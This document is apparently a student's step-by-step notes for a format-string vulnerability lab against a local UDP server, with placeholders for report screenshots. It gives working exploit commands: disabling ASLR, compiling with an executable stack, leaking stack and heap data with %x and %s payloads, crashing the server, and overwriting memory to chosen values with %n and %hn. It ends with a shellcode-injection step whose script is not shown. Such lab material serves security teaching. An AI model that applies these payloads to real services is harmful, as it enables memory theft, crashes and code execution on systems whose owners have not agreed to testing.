0. Setup (VERY IMPORTANT)
0.1 Disable ASLR
sudo sysctl -w kernel.randomize_va_space=0

Screenshot 1: this command output

1. Compile & Run Server
1.1 Compile
gcc -z execstack -o server server.c

 Screenshot 2: compilation result (warning is OK)

1.2 Run server (Terminal 1)
sudo ./server

 Screenshot 3: server running

1.3 Connect (Terminal 2)
nc -u 127.0.0.1 9090

Type:

hello

Screenshot 4: client + server output

2. Stack Investigation
2.1 Print stack values
echo "%x %x %x %x %x %x %x" | nc -u 127.0.0.1 9090

 Screenshot 5: output showing addresses

2.2 Find offset (important)
echo "AAAA %x %x %x %x %x %x %x %x" | nc -u 127.0.0.1 9090

 Look where 41414141 appears → this is your offset

 Screenshot 6: where AAAA appears

 3. Crash Program
3.1 Crash it
echo "%s%s%s%s%s%s%s%s%s" | nc -u 127.0.0.1 9090

 Screenshot 9: server crash

 4. Read Memory
4.A Stack data
4.1
echo "AAAA %x %x %x %x %x %x %x %x" | nc -u 127.0.0.1 9090

 Screenshot 10: stack output

4.B Heap (SECRET)
4.2 Get secret address

Server already prints it (helper)

Example:

0x080b4008
4.3 Use little endian

If address = 0x080b4008

echo $(printf "\x08\x40\x0b\x08")"%x %x %x %s" | nc -u 127.0.0.1 9090

 Screenshot 11: secret printed

 5. Modify Memory
(Using your file)
5.A Change to ANY value
5.1 Edit vul_exploit.py
s = "%x_"*6 + "%n"
5.2 Run
python3 vul_exploit.py
nc -u 127.0.0.1 9090 < badfile

 Screenshot 13: target value changed

5.B Change to 0x500
5.3 Modify
D = 0x500 - 4 - (6*8)
s = "%.8x"*6 + "%." + str(D) + "x" + "%n"
5.4 Run
python3 vul_exploit.py
nc -u 127.0.0.1 9090 < badfile

 Screenshot 15: target = 0x500

5.C Change to 0xFF990000
5.5 Idea (use %hn twice)

 You need 2 addresses (target + target+2)

Example logic:

# first write 0x0000
# second write 0xFF99

Run same way:

python3 vul_exploit.py
nc -u 127.0.0.1 9090 < badfile

 Screenshot 16 & 17

 6. (Optional) Shellcode Injection

Using your file:

6.1 Generate payload
python3 exploit.py
6.2 Send
nc -u 127.0.0.1 9090 < badfile